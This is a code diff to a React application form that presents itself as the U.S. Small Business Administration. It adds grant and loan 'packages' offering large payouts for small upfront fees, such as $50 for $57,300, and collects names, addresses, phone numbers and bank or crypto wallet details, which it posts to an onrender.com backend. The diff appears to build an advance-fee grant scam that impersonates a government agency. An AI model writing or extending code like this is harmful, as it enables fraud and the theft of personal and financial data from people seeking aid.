@@ -3,7 +3,10 @@ import styled from 'styled-components';
 import Axios from "axios";
 import { ClipLoader } from 'react-spinners';
 import { useNavigate } from 'react-router-dom';
-import Swal from 'sweetalert2'
+import Swal from 'sweetalert2';
+import GrantPackages from "./Card";
+import {FaSeedling} from "react-icons/fa"
+
 
 const FormJs = () => {
 
@@ -19,13 +22,15 @@ const FormJs = () => {
     const [postalcode, setPostal] = useState("")
     const [request, setRequest] = useState("")
     const [recommend, setRecommend] = useState("")
+    const [plan, setPlan] = useState("")
+    const [packages, setPackages] = useState("")
     const [description, setDescription] = useState("")
     const [loading, setLoading] = useState(false);
     const [paymentdetails, setPaymentDetails] = useState("")
     // const [acctname, setAcctname] = useState("")
 
 
-    const Data = {username, email, phoneNumber, addressLine1, addressLine2, city, state, postalcode, recommend, request, description, paymentdetails};
+    const Data = {username, email, phoneNumber, addressLine1, addressLine2, city, state, postalcode, recommend, request, description, paymentdetails, plan, packages};
 
     // const url = "http://localhost:4000/api/form";
     const onlineurl = "https://sba-backend.onrender.com/api/form";
@@ -65,11 +70,11 @@ const FormJs = () => {
         setRequest("")
         setDescription("")
         setRecommend("")
+        setPlan("")
+        setPackages("")
         setPostal("")
         setPaymentDetails("")
     }
-
-
 
   return (
     <Container>
@@ -130,13 +135,27 @@ const FormJs = () => {
                         <Input placeholder='Yes / No / Maybe' value={recommend} onChange={(e) => {setRecommend(e.target.value)}}/>
                     </InputHold>
                 </Middle>
+                <Pack>
+                <GrantPackages fontcol="#fff" title="SBA grant packages " bg="#343a49" iconmain={<FaSeedling/>} text="Find an SBA lender near you to help fund your business.." price="Startup grant: $50 for $57,300.00" pay1="Community grant: $160 for $1,000,000.00" pay2="Non-profit organisation: $25 for $35,000.23" pay3="Profit organisation: $30 for $35,000" pay4="Natural disaster damage: $30 for $85,000.19" />
+                <GrantPackages fontcol="#fff" title="SBA-guaranteed business loans" bg="#343a49" iconmain={<FaSeedling/>} text="SBA provides limited small business grants and grants to states and eligible community organizations to promote entrepreneurship." price="Business Loan: $80 for $96,000.34" pay1="Home /  Business disaster loan: $40 for $48,000.43" pay2="Housing and personal assistance: $35 for $40, 000.90" pay3="Physical damage loan: $60 for $64,000.00"/>
+                </Pack>
+                <Middle>
+                    <InputHold>
+                        <Title>What are you applying for?(Grant / Loan)</Title>
+                        <Input placeholder='Grant or Loan' value={packages} onChange={(e) => {setPackages(e.target.value)}}/>
+                    </InputHold>
+                    <InputHold>
+                        <Title>what grant/ loan plan are you applying for?</Title>
+                        <Input placeholder='e.g: startup grant package: $50 for $57,300.00' value={plan} onChange={(e) => {setPlan(e.target.value)}}/>
+                    </InputHold>
+                </Middle>
                     <InputHold2>
-                        <Title>What are you applying for? (grant/loan) and state valid reasons why you should be considered for it.</Title>
-                        <Input2 placeholder='describe your application and reasons for application' value={description} onChange={(e) => {setDescription(e.target.value)}}/>
+                        <Title>State valid reasons why you should be considered for it.</Title>
+                        <Input2 placeholder='state reasons why you should be considered for this grant or why you need the loan?' value={description} onChange={(e) => {setDescription(e.target.value)}}/>
                     </InputHold2>
                     <InputHold>
                         <Title>Payment Details</Title>
-                        <Input3 placeholder='Input payment details to receive grant / loan' value={paymentdetails} onChange={(e) => {setPaymentDetails(e.target.value)}}/>
+                        <Input3 placeholder="input payment details to receive grant / loan.. e.g: 0123456789 allison wells, Kayne Bank OR wallet address E12yh38279302 etc..." value={paymentdetails} onChange={(e) => {setPaymentDetails(e.target.value)}}/>
                     </InputHold>
                     <Button type='submit'>{loading ? <ClipLoader size={25} thickness={100} speed={100} color="rgba(255, 255, 255, 1)" secondarycolor="rgba(0, 0, 0, 0.44)" /> : "Submit" }</Button>
             </Form>
@@ -302,6 +321,13 @@ justify-content: space-between;
 @media Screen and (max-width: 768px){
     flex-direction: column;
 }
+`;
+const Pack = styled.div`
+width: 100%;
+height: max-content;
+display: flex;
+justify-content: space-between;
+align-items: center;
 `;
 const Button = styled.button`
 color: white;
